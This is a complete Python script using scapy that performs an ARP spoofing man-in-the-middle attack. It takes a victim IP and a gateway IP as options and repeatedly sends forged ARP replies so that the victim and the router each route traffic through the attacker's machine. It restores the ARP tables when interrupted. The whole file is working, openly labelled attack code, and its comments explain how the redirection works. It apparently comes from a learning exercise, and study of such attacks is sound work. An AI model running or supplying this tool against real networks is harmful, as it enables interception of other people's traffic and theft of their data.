import scapy.all as scapy
import time
import optparse

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-a', '--dstip', dest= 'targetIp', help='Victim ip address')
    parser.add_option('-b', '--gtwip', dest= 'gatewayIp', help='Gateway ip address')
    options = parser.parse_args()[0]
    return options

def getMac(ip):
    arpRequest = scapy.ARP(pdst= ip)
    broadcast = scapy.Ether(dst= 'ff:ff:ff:ff:ff:ff')
    # Ask which device owns the target ip and the device which has the ip will replies with its ip an 
    # mac address(ARP)
    arpRequestBroadcast = broadcast/arpRequest
    answeredList = scapy.srp(arpRequestBroadcast, timeout= 1, verbose = False)[0]
    return answeredList[0][1].hwsrc  

# ARP spoof attack
def spoof(targetIp, spoofIp):
    # Replace the target ip and mac to our ip and mac
    targetMac = getMac(targetIp)
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
    scapy.send(packet, verbose=False)

# Restore ARP tables to previous values
def restore_arp_tables(destIp, srcIp):
    destMac = getMac(destIp)
    srcMac = getMac(srcIp)
    packet = scapy.ARP(op=2, pdst=destIp, hwdst=destMac, psrc=srcIp, hwsrc=srcMac)
    scapy.send(packet, count=4, verbose=False)

# Run attack
sentPackets = 0
ips = getArguments()
try:
    while True:
        # Send an ARP packet to the victim's machine when we'll replace the router address to our ip
        # and mac and in the router's ARP table we replace the victim's ip and mac to our address to
        # redirect all the traffic to our machine
        spoof(ips.targetIp, ips.gatewayIp) # Tell to victim's device that we're the router
        spoof(ips.gatewayIp, ips.targetIp) # Tell to router that we're the victim's device
        sentPackets += 2
        print('\rSent packets: ' + str(sentPackets), end= '')
        time.sleep(2)

except KeyboardInterrupt: 
    print('\nFinishing execution... Restoring ARP tables...')
    restore_arp_tables(ips.targetIp, ips.gatewayIp)
    restore_arp_tables(ips.gatewayIp, ips.targetIp)
    print('Program finished')
